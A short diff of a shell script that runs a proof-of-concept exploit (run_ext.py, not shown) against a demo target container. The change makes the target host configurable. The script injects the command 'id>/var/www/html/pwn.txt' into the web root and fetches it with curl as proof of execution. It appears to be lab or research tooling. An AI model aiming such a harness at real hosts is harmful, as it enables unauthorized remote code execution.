@@ -2,6 +2,7 @@
 set -u
 
 PORT=18102
+HOST="${HOST:-127.0.0.1}"
 NAME="demo-target-$(date +%s)"
 ROOT_DIR="$(cd "$(dirname "$0")" && pwd)"
 EXPLOIT_DIR="$ROOT_DIR/exploit"
@@ -14,11 +15,11 @@ echo
 
 echo "=== [2/4] run external-only PoC ==="
 cd "$EXPLOIT_DIR"
-python3 run_ext.py --port "$PORT" --shell 'id>/var/www/html/pwn.txt'
+python3 run_ext.py --host "$HOST" --port "$PORT" --shell 'id>/var/www/html/pwn.txt'
 echo
 
 echo "=== [3/4] HTTP proof ==="
-curl -s -w "\nHTTP %{http_code}\n" "http://127.0.0.1:$PORT/pwn.txt"
+curl -s -w "\nHTTP %{http_code}\n" "http://$HOST:$PORT/pwn.txt"
 echo
 
 echo "=== [4/4] done; container $NAME left running for inspection ==="
